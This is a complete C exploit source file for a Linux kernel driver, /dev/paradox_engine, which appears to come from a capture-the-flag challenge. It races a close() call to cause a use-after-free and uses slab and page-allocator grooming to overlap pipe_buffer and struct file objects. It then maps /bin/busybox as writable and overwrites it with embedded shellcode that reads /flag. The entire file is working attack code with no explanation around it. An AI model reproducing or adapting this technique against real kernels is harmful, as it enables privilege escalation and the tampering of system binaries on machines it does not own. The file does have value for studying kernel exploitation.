#define _GNU_SOURCE
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#define TARGET_DEVICE "/dev/paradox_engine"

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

#define PARADOX_CREATE_TIMELINE _IOWR('k', 1, struct paradox_timeline_req)
#define PARADOX_CREATE_EVENT    _IOWR('k', 2, struct paradox_event_req)

struct paradox_timeline_req {
    unsigned long cause_timeline_id, cause_event_id;
    unsigned long new_timeline_id;
};
struct paradox_event_req {
    unsigned long target_timeline_id;
    unsigned long cause_event_id;
    char description[64];
    unsigned long new_event_id;
};

void pin_on_cpu(int cpu_id)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_id, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

unsigned long paradox_create_timeline(
                        int fd,
                        unsigned long cause_timeline_id,
                        unsigned long cause_event_id)
{
    struct paradox_timeline_req req = {
        .cause_timeline_id = cause_timeline_id,
        .cause_event_id = cause_event_id,
    };
    SYSCHK(ioctl(fd, PARADOX_CREATE_TIMELINE, &req));
    return req.new_timeline_id;
}

unsigned long paradox_create_event(
                        int fd,
                        unsigned long target_timeline_id,
                        unsigned long cause_event_id,
                        char *desc)
{
    struct paradox_event_req req = {
        .target_timeline_id = target_timeline_id,
        .cause_event_id = cause_event_id,
    };

    if (desc)
        memcpy(req.description, desc, sizeof(req.description));

    SYSCHK(ioctl(fd, PARADOX_CREATE_EVENT, &req));
    return req.new_event_id;
}

int pfds[0x80][2];
int populated_pfds[0x80][2];
int paradox_engine_fds_drain_CPU0[0x1000];
int paradox_engine_fd;
char dummy[0x1000];
char rbuf[0x1000];

void *race(void *arg)
{
    pin_on_cpu(1);
    close(paradox_engine_fd);
    return NULL;
}

/*
120: /sys/kernel/slab/temporal_event_cache/cpu_partial
0:   /sys/kernel/slab/temporal_event_cache/order
112: /sys/kernel/slab/temporal_event_cache/slab_size
36:  /sys/kernel/slab/temporal_event_cache/objs_per_slab
5:   /sys/kernel/slab/temporal_event_cache/min_partial
7:   cpu_partial_slabs
*/

unsigned char busybox_payload[] = {
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00 ,0x00, 0x00, 0x1f, 0x80, 0x4a, 0x00,
};

unsigned char orw[] = {0x48,0xb8,0x2f,0x66,0x6c,0x61,0x67,0x0,0x0,0x0,0x50,0x48,0xc7,0xc0,0x2,0x0,0x0,0x0,0x48,0x89,0xe7,0x48,0xc7,0xc6,0x0,0x0,0x0,0x0,0x48,0xc7,0xc2,0x0,0x0,0x0,0x0,0xf,0x5,0x48,0x89,0xc7,0x48,0x89,0xe6,0x48,0xc7,0xc2,0x0,0x2,0x0,0x0,0x48,0xc7,0xc0,0x0,0x0,0x0,0x0,0xf,0x5,0x48,0xc7,0xc7,0x0,0x0,0x0,0x0,0x48,0xc7,0xc0,0x1,0x0,0x0,0x0,0xf,0x5,0xeb,0xfe};

int main()
{
    pthread_t tid;
    struct rlimit limit;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    getrlimit(RLIMIT_NOFILE, &limit);
    limit.rlim_cur = limit.rlim_max;
    setrlimit(RLIMIT_NOFILE, &limit);
    
    pin_on_cpu(1);
    for (int i = 0; i < 0x80; i++) {
        SYSCHK(pipe(pfds[i]));
    }

    for (int i = 0; i < 0x80; i++) {
        SYSCHK(pipe(populated_pfds[i]));
        for (int j = 0; j < 4; j++) {
            write(populated_pfds[i][1], dummy, sizeof(dummy));
        }
    }

    pin_on_cpu(0);
    SYSCHK(paradox_engine_fd = open(TARGET_DEVICE, O_RDWR));
    for (int i = 0; i < 35; i++) {
        SYSCHK(open(TARGET_DEVICE, O_RDWR));
    }

    int eventA_id = paradox_create_event(paradox_engine_fd, 0, 1, NULL); // event-A
    for (int i = 0; i < 8 * 36; i++) {
        paradox_engine_fds_drain_CPU0[i] = open(TARGET_DEVICE, O_RDWR);
    }

    for (int i = 0; i < 0x80000; i++) {
        paradox_create_timeline(paradox_engine_fd, 0, 0);
    }

    for (int i = 0; i < 0x40; i++) {
        paradox_create_timeline(paradox_engine_fd, 0, eventA_id);
    }

    close(paradox_engine_fds_drain_CPU0[0]);

    pin_on_cpu(0);
    pthread_create(&tid, NULL, race, NULL);
    sleep(1);
    
    printf("[+] free to buddy system\n");
    for (int i = 1; i < 8 * 36; i++) {
        close(paradox_engine_fds_drain_CPU0[i]);
    }

    for (int i = 0; i < 0x80; i++) {
        SYSCHK(fcntl(pfds[i][0], F_SETPIPE_SZ, 4 * 0x1000));
    }

    for (int i = 0; i < 0x80; i++) {
        SYSCHK(fcntl(pfds[i][0], F_SETPIPE_SZ, 0x1000));
    }

    for (int i = 0; i < 0x80; i++) {
        SYSCHK(fcntl(populated_pfds[i][0], F_SETPIPE_SZ, 4 * 0x1000));
    }

    sleep(1);
    memset(dummy, 'A', sizeof(dummy));
    for (int i = 0; i < 0x80; i++) {
        close(pfds[i][0]);
        close(pfds[i][1]);
    }

    for (int i = 0; i < 0x80; i++) {
        for (int j = 0; j < 4; j++) {
            SYSCHK(read(populated_pfds[i][0], rbuf, sizeof(rbuf)));
            if (strlen(rbuf)) {
                // UAF page in tmp_page

                printf("[+] pipe_buffer overlap\n");
                SYSCHK(read(populated_pfds[i][0], rbuf, sizeof(rbuf)));
                SYSCHK(read(populated_pfds[i][0], rbuf, sizeof(rbuf)));
                
                // UAF page is now in pcp_list
                SYSCHK(read(populated_pfds[i][0], rbuf, sizeof(rbuf)));
                
                // reclaim by struct file
                int busybox_fds[0x400];
                for (int k = 0; k < 0x400; k++) {
                    busybox_fds[k] = open("/bin/busybox", O_RDONLY);
                    if (busybox_fds[k] == -1) {
                        printf("%d\n", k);
                    }
                }

                // reclaim UAF page
                SYSCHK(write(populated_pfds[i][1], busybox_payload, sizeof(busybox_payload)));

                void *ptr;
                for (int k = 0; k < 0x400; k++) {
                    ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, busybox_fds[k], 0xe000);
                    if (ptr != MAP_FAILED) {
                        printf("[+] try to overwrite busybox\n");
                        memcpy(ptr + 0x250, orw, sizeof(orw));
                        break;
                    }
                }

                return 0;
            }
            SYSCHK(write(populated_pfds[i][1], dummy, sizeof(dummy)));
        }
    }
    return 0;
}